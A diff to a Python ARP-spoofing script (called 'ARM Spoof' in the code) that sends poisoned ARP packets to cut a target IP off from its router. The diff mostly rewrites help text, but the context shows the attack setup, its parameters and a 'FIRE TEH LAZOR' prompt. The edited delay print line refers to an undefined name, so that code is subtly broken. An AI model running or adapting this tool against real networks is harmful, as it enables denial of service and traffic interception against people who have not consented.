@@ -9,13 +9,13 @@ import argparse
 
 # Command line parameters
 parser = argparse.ArgumentParser(description='ARM Spoof a target')
-parser.add_argument('-c', '--count',  action="store", dest="count",  default="-1", type=int,      help="Count")
-parser.add_argument('-d', '--delay',  action="store", dest="delay",  default="1000", type=int,    help="Delay")
-parser.add_argument('-r', '--reject', action="store", dest="reject", default="192.168.0.1",       help="IP to Reject")
-parser.add_argument('-m', '--mac',    action="store", dest="mac",    default="aa:bb:cc:dd:ee:ff", help="* MAC address to spoof")
-parser.add_argument('-m2','--hwdst',  action="store", dest="hwdst",  default="ff:ff:ff:ff:ff:ff", help="* MAC address to send to")
-parser.add_argument('-o', '--op',     action="store", dest="op",     default="2", type=int, help="* No idea, ARP().op variable")
-parser.add_argument('target',         action="store", help="IP to ARM Spoof")
+parser.add_argument('-c', '--count',  action="store", dest="count",  default="-1", type=int,      help="Number of packets to send, -1 is infinate")
+parser.add_argument('-d', '--delay',  action="store", dest="delay",  default="1000", type=int,    help="Delay in ms, they only last a short time, so keep spamming")
+parser.add_argument('-r', '--reject', action="store", dest="reject", default="192.168.0.1",       help="IP to Reject access from (router)")
+parser.add_argument('-m', '--mac',    action="store", dest="mac",    default="aa:bb:cc:dd:ee:ff", help="MAC address to spoof")
+parser.add_argument('-m2','--hwdst',  action="store", dest="hwdst",  default="ff:ff:ff:ff:ff:ff", help="MAC address to send to")
+parser.add_argument('-o', '--op',     action="store", dest="op",     default="2", type=int, help="ARP().op variable (defaults to 2)")
+parser.add_argument('target',         action="store", help="IP to attack with ARM Spoof")
 args = parser.parse_args()
 
 # Setup poisoned ARP packet
@@ -30,7 +30,7 @@ dosA.pdst = args.target
 dosA.display()
 print "Target:",args.target
 print "Reject:",args.reject
-print "Delay:",args.delay
+print "Delay:",args.delay,ms
 print "Count:",args.count
 print "WARNING! Can cause harm to network. Make sure you know who your doing this to"
 raw_input("Press ENTER to FIRE TEH LAZOR! (to continue)")
